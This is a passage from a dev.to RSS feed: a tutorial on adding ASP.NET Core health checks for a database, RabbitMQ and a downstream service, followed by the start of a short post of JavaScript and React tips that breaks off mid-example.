      <description>&lt;h2&gt;
  &lt;a href="#tldr"&gt;
  &lt;/a&gt;
  TL;DR
&lt;/h2&gt;

&lt;p&gt;Health checks are valuable and it is pretty straightforward to use them in ASP.NET Core. I've created a coding story to show you how to add and use them in different scenarios. (database, rabbitmq, downstream services).&lt;/p&gt;




&lt;p&gt;Observability of the system is crucial for successful maintenance and monitoring. Health checks help you with that!&lt;/p&gt;

&lt;p&gt;Below, you can find a coding story that describes the process of adding health checks support to ASP.NET Core project.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://codingstories.io/story/https:%2F%2Fgitlab.com%2FNikiforovAll%2Fhow-to-add-health-checks-to-aspnetcore"&gt;https://codingstories.io/story/https:%2F%2Fgitlab.com%2FNikiforovAll%2Fhow-to-add-health-checks-to-aspnetcore&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3&gt;
  &lt;a href="#sneak-peek-the-result"&gt;
  &lt;/a&gt;
  Sneak peek the result
&lt;/h3&gt;

&lt;p&gt;By the end of the coding story, you will see something like the following:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Startup&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="n"&gt;IConfiguration&lt;/span&gt; &lt;span class="n"&gt;Configuration&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="k"&gt;get&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;set&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
   &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="nf"&gt;Startup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IConfiguration&lt;/span&gt; &lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
   &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Configuration&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt;

   &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;ConfigureServices&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IServiceCollection&lt;/span&gt; &lt;span class="n"&gt;services&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
   &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;connectionString&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Configuration&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;GetConnectionString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"DefaultConnection"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;rabbitMqConnectionString&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Configuration&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;GetConnectionString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"RabbitMQ"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;downstreamServiceUrl&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Configuration&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;"DownstreamService:BaseUrl"&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
      &lt;span class="n"&gt;services&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;AddHealthChecks&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;AddSqlServer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
               &lt;span class="n"&gt;connectionString&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
               &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;"Database"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
               &lt;span class="n"&gt;failureStatus&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;HealthStatus&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Degraded&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
               &lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;TimeSpan&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;FromSeconds&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
               &lt;span class="n"&gt;tags&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="s"&gt;"services"&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt;
            &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;AddRabbitMQ&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
               &lt;span class="n"&gt;rabbitMqConnectionString&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
               &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;"RabbitMQ"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
               &lt;span class="n"&gt;failureStatus&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;HealthStatus&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Degraded&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
               &lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;TimeSpan&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;FromSeconds&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
               &lt;span class="n"&gt;tags&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="s"&gt;"services"&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt;
            &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;AddUrlGroup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
               &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;Uri&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;$"&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;downstreamServiceUrl&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="s"&gt;/health"&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
               &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;"Downstream API Health Check"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
               &lt;span class="n"&gt;failureStatus&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;HealthStatus&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Unhealthy&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
               &lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;TimeSpan&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;FromSeconds&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
               &lt;span class="n"&gt;tags&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="s"&gt;"services"&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt;

   &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;Configure&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IApplicationBuilder&lt;/span&gt; &lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
   &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;UseRouting&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

      &lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;UseEndpoints&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;endpoints&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt;
      &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;endpoints&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;MapCustomHealthCheck&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

            &lt;span class="n"&gt;endpoints&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;MapGet&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"/{**path}"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt;
            &lt;span class="p"&gt;{&lt;/span&gt;
               &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;WriteAsync&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
                  &lt;span class="s"&gt;"Navigate to /health to see the health status."&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="p"&gt;});&lt;/span&gt;
      &lt;span class="p"&gt;});&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;
&lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;EndpointRouteBuilderExtensions&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="c1"&gt;/// &amp;lt;summary&amp;gt;&lt;/span&gt;
   &lt;span class="c1"&gt;/// Adds a Health Check endpoint to the &amp;lt;see cref="IEndpointRouteBuilder"/&amp;gt; with the specified template.&lt;/span&gt;
   &lt;span class="c1"&gt;/// &amp;lt;/summary&amp;gt;&lt;/span&gt;
   &lt;span class="c1"&gt;/// &amp;lt;param name="endpoints"&amp;gt;The &amp;lt;see cref="IEndpointRouteBuilder"/&amp;gt; to add endpoint to.&amp;lt;/param&amp;gt;&lt;/span&gt;
   &lt;span class="c1"&gt;/// &amp;lt;param name="pattern"&amp;gt;The URL pattern of the liveness endpoint.&amp;lt;/param&amp;gt;&lt;/span&gt;
   &lt;span class="c1"&gt;/// &amp;lt;param name="servicesPattern"&amp;gt;The URL pattern of the readiness endpoint.&amp;lt;/param&amp;gt;&lt;/span&gt;
   &lt;span class="c1"&gt;/// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
   &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="n"&gt;IEndpointRouteBuilder&lt;/span&gt; &lt;span class="nf"&gt;MapCustomHealthCheck&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
      &lt;span class="k"&gt;this&lt;/span&gt; &lt;span class="n"&gt;IEndpointRouteBuilder&lt;/span&gt; &lt;span class="n"&gt;endpoints&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;pattern&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;"/health"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;servicesPattern&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;"/health/ready"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
   &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;endpoints&lt;/span&gt; &lt;span class="p"&gt;==&lt;/span&gt; &lt;span class="k"&gt;null&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
      &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;throw&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;ArgumentNullException&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;nameof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;endpoints&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;

      &lt;span class="n"&gt;endpoints&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;MapHealthChecks&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pattern&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;HealthCheckOptions&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
      &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;Predicate&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;check&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;!&lt;/span&gt;&lt;span class="n"&gt;check&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Tags&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Contains&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"services"&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
            &lt;span class="n"&gt;AllowCachingResponses&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="n"&gt;ResponseWriter&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;WriteResponse&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="p"&gt;});&lt;/span&gt;
      &lt;span class="n"&gt;endpoints&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;MapHealthChecks&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;servicesPattern&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;HealthCheckOptions&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
      &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;Predicate&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;check&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="n"&gt;AllowCachingResponses&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="n"&gt;ResponseWriter&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;WriteResponse&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="p"&gt;});&lt;/span&gt;

      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;endpoints&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt;

   &lt;span class="k"&gt;private&lt;/span&gt; &lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="n"&gt;Task&lt;/span&gt; &lt;span class="nf"&gt;WriteResponse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpContext&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;HealthReport&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
   &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ContentType&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;"application/json; charset=utf-8"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

      &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;options&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;JsonWriterOptions&lt;/span&gt;
      &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;Indented&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt;
      &lt;span class="p"&gt;};&lt;/span&gt;

      &lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;var&lt;/span&gt; &lt;span class="n"&gt;stream&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;MemoryStream&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
      &lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;writer&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;Utf8JsonWriter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stream&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
      &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;writer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;WriteStartObject&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
            &lt;span class="n"&gt;writer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;WriteString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"status"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Status&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;ToString&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
            &lt;span class="n"&gt;writer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;WriteStartObject&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"results"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;entry&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Entries&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="p"&gt;{&lt;/span&gt;
               &lt;span class="n"&gt;writer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;WriteStartObject&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;entry&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Key&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
               &lt;span class="n"&gt;writer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;WriteString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"status"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;entry&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Value&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Status&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;ToString&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
               &lt;span class="n"&gt;writer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;WriteEndObject&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
            &lt;span class="n"&gt;writer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;WriteEndObject&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
            &lt;span class="n"&gt;writer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;WriteEndObject&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;

      &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UTF8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;GetString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;ToArray&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;

      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;WriteAsync&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;p&gt;Please let me know what you think about this coding story. Feedback is very much appreciated 👍.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#reference"&gt;
  &lt;/a&gt;
  Reference
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.microsoft.com/en-us/aspnet/core/host-and-deploy/health-checks"&gt;https://docs.microsoft.com/en-us/aspnet/core/host-and-deploy/health-checks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://gitlab.com/NikiforovAll/how-to-add-health-checks-to-aspnetcore"&gt;https://gitlab.com/NikiforovAll/how-to-add-health-checks-to-aspnetcore&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>csharp</category>
      <category>aspnetcore</category>
      <category>todayilearned</category>
      <category>codingstories</category>
    </item>
    <item>
      <title>TIPS &amp; TRICKS OF JAVASCRIPT &amp; REACT</title>
      <author>Rocky</author>
      <pubDate>Sun, 25 Jul 2021 15:29:51 +0000</pubDate>
      <link>https://dev.to/coderzx/tips-tricks-of-javascript-react-49am</link>
      <guid>https://dev.to/coderzx/tips-tricks-of-javascript-react-49am</guid>
      <description>&lt;h1&gt;TIPS 1: Easiest way of string to integer conversion.&lt;/h1&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const value_1 = "1" 

&lt;p&gt;const value_2 = "2"&lt;/p&gt;

&lt;p&gt;function add(field_1, field_2){&lt;/p&gt;

&lt;p&gt;return field_1 + field_2;&lt;br&gt;
}&lt;/p&gt;

&lt;p&gt;add(+value_1, +value_2); &lt;br&gt;
&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;
&lt;a href="https://dev.to/nipu/tips-tricks-of-javascript-react-3ncc#tips-2-easiest-way-of-float-to-integer-conversion"&gt;&lt;/a&gt;TIPS 2: Easiest way of float to integer conversion.&lt;/h1&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const floatToInt = 23.9 | 0;&lt;br&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;
&lt;a href="https://dev.to/nipu/tips-tricks-of-javascript-react-3ncc#tips-3-use-global-object-always-should-not-need-localstorage"&gt;&lt;/a&gt;TIPS 3: Use Global object always should not need localStorage&lt;/h1&gt;
&lt;p&gt;&lt;span&gt;&lt;em&gt;Note[if data is is static then you should use it. and don’t use any kind secret or confidential data here..]&lt;/em&gt;&lt;/span&gt;&lt;br&gt;&lt;/p&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const user = {

&lt;p&gt;first_name: "Rowan",&lt;/p&gt;

&lt;p&gt;last_name: "Atkinson"&lt;br&gt;
}&lt;/p&gt;

&lt;p&gt;window.user=user&lt;br&gt;
&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;
&lt;a href="https://dev.to/nipu/tips-tricks-of-javascript-react-3ncc#tips-3-dont-use-if-not-necessary-ternary-"&gt;&lt;/a&gt;TIPS 3: Don’t use if not necessary ternary (?:)&lt;/h1&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const DemoComponent = ()=&amp;gt;{

&lt;p&gt;const [show, setShow] = useState(false)&lt;/p&gt;

&lt;p&gt;return (&amp;lt;div&amp;gt;&lt;/p&gt;

